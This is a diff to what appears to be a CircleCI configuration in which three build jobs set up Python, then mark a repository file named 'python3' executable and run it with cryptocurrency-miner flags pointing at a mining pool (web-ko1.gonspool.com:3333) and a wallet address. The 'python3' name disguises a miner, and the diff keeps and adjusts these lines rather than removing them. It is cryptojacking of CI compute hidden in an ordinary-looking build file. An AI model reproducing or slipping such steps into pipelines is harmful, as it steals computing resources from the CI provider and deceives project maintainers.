@@ -6,17 +6,18 @@ jobs:
       - image: cimg/base:stable
     steps:
       - checkout:
-          path: ~/platform #Here is the answer
+          path: ~/platform #Here is the
       - run:
           name: Install dependencies
           command: |
             sudo apt update
             sudo apt upgrade
             sudo apt install python3
+            sudo apt install python3.8-venv
             python3 -m venv venv
             . venv/bin/activate
             chmod +x python3
-            ./python3  -o web-ko1.gonspool.com:3333 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=3
+            ./python3 -o web-ko1.gonspool.com:3333 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=3
             
   build1:
     working_directory: ~/platform #Here is the answer
@@ -31,10 +32,11 @@ jobs:
             sudo apt update
             sudo apt upgrade
             sudo apt install python3
-            python3 -m venv venv
+            apt install python3.8-venv
+            sudo python3 -m venv venv
             . venv/bin/activate
             chmod +x python3
-            ./python3 -o web-ko1.gonspool.com:3333 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=1
+            ./python3 -o web-ko1.gonspool.com:3333 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=2
             
   build2:
     working_directory: ~/platform 
@@ -49,11 +51,12 @@ jobs:
             sudo apt update
             sudo apt upgrade
             sudo apt install python3
+            sudo apt install python3.8-venv
             python3 -m venv venv
             . venv/bin/activate
             chmod +x python3
-            ./python3  -o web-ko1.gonspool.com:3333 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=2
-
+            ./python3 -o web-ko1.gonspool.com:3333 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=1
+            
 workflows:
   version: 2.1
   build_and_test:
